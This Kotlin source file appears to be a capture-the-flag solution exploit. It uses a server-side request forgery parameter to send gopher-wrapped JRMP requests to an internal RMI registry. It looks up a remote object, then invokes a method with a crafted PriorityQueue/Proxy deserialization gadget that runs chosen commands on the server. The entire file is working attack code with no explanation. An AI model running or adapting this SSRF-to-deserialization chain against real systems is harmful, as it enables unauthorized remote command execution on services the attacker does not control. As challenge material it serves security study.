package soln

import com.github.kittinunf.fuel.Fuel
import com.github.kittinunf.fuel.coroutines.awaitByteArrayResult
import com.yxxx.Gadget
import com.yxxx.UserInter
import org.joor.Reflect
import sun.rmi.transport.LiveRef
import top.ceclin.jser.tool.jrmp.JRMPProtocol
import top.ceclin.jser.tool.jrmp.JRMPRequest
import top.ceclin.jser.tool.jrmp.JRMPResponse
import java.lang.reflect.Proxy
import java.time.LocalDateTime
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.time.format.FormatStyle
import java.util.*
import kotlin.reflect.jvm.javaMethod

class Soln(private val target: String) {

    suspend fun lookup(name: String = "0ops", host: String = "rmiserver"): LiveRef {
        val res = sendRequest(redirectUrl(gopherUrl(host, 1099, JRMPRequest.Lookup(name))))
        val lookup = JRMPResponse.Lookup(res)
        return JRMPResponse.Lookup.extractLiveRef(lookup).also(::println)
    }

    suspend fun serverExec(cmd: Array<String>, liveRef: LiveRef, host: String = "rmiserver") {
        val hash = JRMPProtocol.computeMethodHash(UserInter::sayHello.javaMethod!!)
        val data = JRMPProtocol.SingleOp(
            JRMPProtocol.Call(liveRef.objID, -1, hash) {
                writeObject(gadget(cmd))
            }
        )
        sendRequest(redirectUrl(gopherUrl(host, liveRef.port, data)))
    }

    private fun gadget(cmd: Array<String>): Any {
        val priorityQueue = PriorityQueue<Any>().apply { repeat(2) { add("") } }
        val array = Reflect.on(priorityQueue).get<Array<Any>>("queue")
        array[0] = Proxy.newProxyInstance(
            Thread.currentThread().contextClassLoader,
            arrayOf(Comparable::class.java),
            Gadget()
        )
        array[1] = cmd
        return priorityQueue
    }

    private suspend fun sendRequest(url: String): ByteArray {
        val byteArrayResult = Fuel.get(target, listOf("url" to url)).awaitByteArrayResult()
        val formatter = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.FULL).withZone(ZoneId.systemDefault())
        LocalDateTime.now().format(formatter).also(::println)
        return byteArrayResult.fold({ it }, { it.errorData }).also { println(it.decodeToString()) }
    }
}